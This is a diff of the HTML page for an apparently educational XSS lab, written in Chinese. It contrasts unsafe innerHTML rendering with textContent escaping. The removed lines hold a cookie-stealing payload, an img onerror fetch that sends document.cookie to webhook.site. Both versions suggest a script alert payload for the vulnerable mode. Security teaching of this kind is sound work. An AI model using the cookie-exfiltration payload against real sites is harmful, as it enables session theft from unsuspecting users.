@@ -2,37 +2,25 @@
 <html lang="zh-CN">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>D3 - 基础 XSS 与 Cookie 窃取演示</title>
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@picocss/pico@2.0.6/css/pico.min.css">
+    <title>D3 - XSS</title>
+    <link rel="stylesheet" href="/css/style.css">
 </head>
-<body class="container">
-    <hgroup>
-        <h2>🛡️ 实验 1：反射型 XSS 与 Cookie 窃取</h2>
-        <p>演示 <code>innerHTML</code> 的漏洞与 <code>textContent</code> 的防御机制。</p>
-    </hgroup>
+<body>
+    <div class="terminal-panel panel-orange">
+        <h2 style="color: var(--color-orange);">[D3] Reflection XSS</h2>
+        <p>测试 Payload: <code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
+        
+        <input type="text" id="myInput" placeholder="Inject payload here..." autocomplete="off">
+        
+        <div class="btn-group">
+            <button onclick="testUnsafe()" class="btn btn-orange">Execute Attack</button>
+            <button onclick="testSafe()" class="btn btn-green">Defend Mode</button>
+        </div>
 
-    <article>
-        <header>💡 提示：试着输入以下 Payload</header>
-        <p>基础弹窗：<code>&lt;script&gt;alert('你被攻击了')&lt;/script&gt;</code></p>
-        <p>窃取 Cookie（去 webhook.site 申请个链接替换进去）：<br>
-        <code>&lt;img src=x onerror="fetch('https://webhook.site/你的专属URL?cookie=' + document.cookie)"&gt;</code></p>
-    </article>
-
-    <label for="myInput">输入测试内容：</label>
-    <input type="text" id="myInput" placeholder="在这里输入恶意代码...">
-
-    <div class="grid">
-        <button onclick="testUnsafe()" class="contrast" style="background-color: #e74c3c; border-color: #e74c3c;">⚠️ 漏洞模式（直接执行）</button>
-        <button onclick="testSafe()" style="background-color: #2ecc71; border-color: #2ecc71;">✅ 防御模式（转义显示）</button>
+        <h3 style="font-size: 14px; margin-top: 30px;">> OUTPUT_LOG:</h3>
+        <div id="resultBox" class="terminal-output">[Awaiting input...]</div>
     </div>
-
-    <h3>结果显示区：</h3>
-    <article id="resultBox" style="min-height: 100px;">
-        等待输入...
-    </article>
-
-    <!-- 引入外部的 JS 文件 -->
+    <a href="/" class="back-link">&lt; RETURN TO TERMINAL</a>
     <script src="app.js"></script>
 </body>
 </html>
